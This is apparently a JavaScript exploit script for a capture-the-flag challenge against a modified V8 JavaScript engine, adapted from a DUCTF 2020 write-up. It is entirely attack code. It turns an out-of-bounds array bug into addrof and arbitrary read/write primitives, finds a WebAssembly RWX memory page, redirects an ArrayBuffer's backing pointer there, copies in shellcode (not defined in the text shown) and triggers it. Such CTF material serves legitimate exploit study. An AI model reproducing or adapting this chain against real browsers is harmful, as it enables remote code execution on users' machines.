// Code heavily inspired by https://seb-sec.github.io/2020/09/28/ductf2020-pwn-or-web.html

// Utils

var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) {
         f64_buf[0] = val;
         return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) {
         u64_buf[0] = Number(val & 0xffffffffn);
         u64_buf[1] = Number(val >> 32n);
         return f64_buf[0];
}

function toHex(val) {
        return "0x" + val.toString(16);
}

console.log("[*] Construct addrof primitive")

let float_arr = [1.1, 2.2, 3.3];
let obj_arr = [{A:1}, {B:2}, {C:3}];
float_arr.setHorsepower(5);
let float_elems = ftoi(float_arr[4]);
let obj_elems = float_elems + 0x30n;
// point float elements to the obj elements
// float_arr and obj_arr now share an elements ptr, but treat
// the elements differently
float_arr[4] = itof(obj_elems);

function addrof(o) {
        obj_arr[0] = o;
        return (ftoi(float_arr[0]) & 0xffffffffn) - 1n;
}

console.log("[*] Construct arbitrary read and write primitives")

function read8(addr) { 
	let f = [1.1, 2.2, 3.3];
	f.setHorsepower(5);
	let x = ftoi(f[4]);
	x = (x >> 32n) << 32n;
	x |= (addr - 8n + 1n) & 0xffffffffn;
	f[4] = itof(x);
	return ftoi(f[0]);
}

function write8(addr, val) { 
	let f = [1.1, 2.2, 3.3];
	f.setHorsepower(5);
	let x = ftoi(f[4]);
	x = (x >> 32n) << 32n;
	x |= (addr - 8n + 1n) & 0xffffffffn;
	f[4] = itof(x);
	f[0] = itof(val);
}

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var wasm_func = wasm_instance.exports.main;

let rwx_base = read8(addrof(wasm_instance) + 0x68n);
console.log("RWX base @ " + toHex(rwx_base));

// buf2 will be used to write outside the heap
let buf2 = new ArrayBuffer(0x100);
let buf2_uint8 = new Uint8Array(buf2);
var buf2_addr = addrof(buf2);
// overwrite backing pointer of buf2
write8(buf2_addr + 0x60n, rwx_base);

console.log("[*] Copy shellcode to RWX mapping");
for (let i = 0; i < shellcode.length; i++) {
    buf2_uint8[i] = shellcode[i];
}

console.log("[*] Trigger shellcode");
wasm_func();
